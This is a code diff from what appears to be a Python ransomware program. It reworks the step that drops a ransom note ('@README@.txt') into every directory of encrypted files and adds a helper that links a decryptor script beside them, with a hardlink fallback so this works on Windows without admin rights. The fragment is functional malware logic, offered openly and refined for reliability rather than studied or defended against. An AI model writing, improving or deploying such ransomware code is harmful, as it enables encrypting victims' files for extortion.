@@ -139,19 +139,35 @@ class Program():
             self.__criptography.encrypt(file)
 
     def __ransomnote(self):
+        # Copy the contents of the ransom note
         with open("ransom_note.txt", "r") as note_file:
             content = note_file.read()
 
-        cwd = os.getcwd()
+        #cwd = os.getcwd()
         for dir in self.__directories_with_files:
             self.__create_ransomnote_file(dir, content)
-            path = os.path.join(dir, "decryptor.py")
-            if not os.path.exists(path):
-                os.symlink(os.path.join(cwd, "decrypt.py"), path)
+            self.__create_decryptor_file(dir)
+            # path = os.path.join(dir, "decryptor.py")
+            # if not os.path.exists(path):
+            #     os.symlink(os.path.join(cwd, "decrypt.py"), path)
 
-    def __create_ransomnote_file(self, dst_path=".", content=None):
+    def __create_ransomnote_file(self, dst_path=".", content=""):
         with open(dst_path + "/@README@.txt", "w") as output_file:
             output_file.write(content)
+
+    def __create_decryptor_file(self, dest="."):
+        # Get the execution directory
+        cwd = os.getcwd()
+        # Get the path where we want to store the decryptor link
+        path = os.path.join(dest, "decryptor.py")
+        try:
+            if not os.path.exists(path):
+                os.symlink(os.path.join(cwd, "decrypt.py"), path)
+        except OSError:
+            # Windows does not support symlinks without admin privileges
+            print(f"Could not create symlink at {path}")
+            # In Windows a hardlink will be created
+            os.link(os.path.join(cwd, "decrypt.py"), path)
 
     def decrypt(self):
         if self.__criptography is None:
